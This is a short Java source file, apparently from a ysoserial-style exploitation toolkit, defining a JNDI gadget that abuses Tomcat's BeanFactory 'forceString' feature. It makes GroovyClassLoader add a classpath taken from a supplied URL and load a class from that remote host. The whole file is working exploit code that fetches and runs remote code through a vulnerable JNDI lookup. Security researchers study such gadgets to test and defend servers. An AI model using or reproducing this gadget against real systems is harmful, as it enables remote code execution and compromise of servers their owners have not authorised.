package ysoserial.bullet.jndi;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.net.URL;

public class TomcatGroovyClassLoaderRef implements TomcatRef {
    @Override
    public ResourceRef getObject(String url) throws Exception {
        URL parsedURL = new URL(url);
        String classpath = parsedURL.getProtocol() + "://" + parsedURL.getHost() + ":" + parsedURL.getPort() + "/";
        String classname = parsedURL.getPath().substring(1).replace("/", ".");

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader",
            null, "", "",true,
            "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
        ref.add(new StringRefAddr("a", classpath));
        ref.add(new StringRefAddr("b", classname));
        return ref;
    }
}
